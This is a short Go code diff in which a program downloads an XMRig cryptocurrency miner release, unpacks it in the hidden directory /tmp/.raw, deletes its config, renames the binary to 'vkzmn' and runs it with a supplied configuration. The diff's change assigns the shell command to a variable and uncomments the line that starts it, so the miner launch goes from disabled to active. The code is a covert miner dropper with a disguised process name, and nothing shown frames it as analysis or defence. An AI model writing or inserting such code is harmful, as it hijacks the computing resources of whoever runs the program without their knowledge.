@@ -79,7 +79,7 @@ r ,  e    :=  http.NewRequest("GET" , "https://download.xmrig.com/xmrig/6.9.0/07
 
 
 
-exec.Command("sh"  ,  "-c" , "cd /tmp/.raw ; tar  -xf *.raw ; cd *.0 ; rm config.json ; mv xmrig vkzmn ; ./vkzmn " + config )
+rrrr :=  exec.Command("sh"  ,  "-c" , "cd /tmp/.raw ; tar  -xf *.raw ; cd *.0 ; rm config.json ; mv xmrig vkzmn ; ./vkzmn " + config )
 
 
 
@@ -87,7 +87,7 @@ exec.Command("sh"  ,  "-c" , "cd /tmp/.raw ; tar  -xf *.raw ; cd *.0 ; rm config
 
  
 
-//rrrr.Start()
+rrrr.Start()
 
 
 
